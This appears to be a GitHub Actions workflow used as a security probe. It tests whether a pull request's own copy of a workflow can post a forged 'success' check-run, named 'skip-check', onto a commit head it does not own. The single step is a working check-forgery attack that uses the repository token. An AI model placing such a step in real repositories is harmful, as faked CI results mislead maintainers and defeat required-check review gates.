name: skip probe

on:
  pull_request_target:
    types: [opened, reopened, synchronize, edited]
    branches: [main]
  pull_request_review:
    types: [submitted]

permissions:
  contents: read
  pull-requests: write
  checks: write

jobs:
  guard:
    name: skip-check
    runs-on: ubuntu-latest
    env:
      GH_TOKEN: ${{ github.token }}
      REPO: ${{ github.repository }}
    steps:
      - name: Post onto a head this pull request does not own
        run: |
          set -euo pipefail
          echo "COPY=AUTHOR-S1 escalation attempt"
          gh api -X POST "repos/$REPO/check-runs" \
            -f name=skip-check -f head_sha=12537cfa8dd1e41e64919f39c687b02f4c25bd20 \
            -f status=completed -f conclusion=success \
            -f output[title]="forged by the author branch" \
            -f output[summary]="posted from s1's own copy of the workflow" \
            --jq '"posted check-run \(.id) onto 12537cfa as \(.name)=\(.conclusion)"'
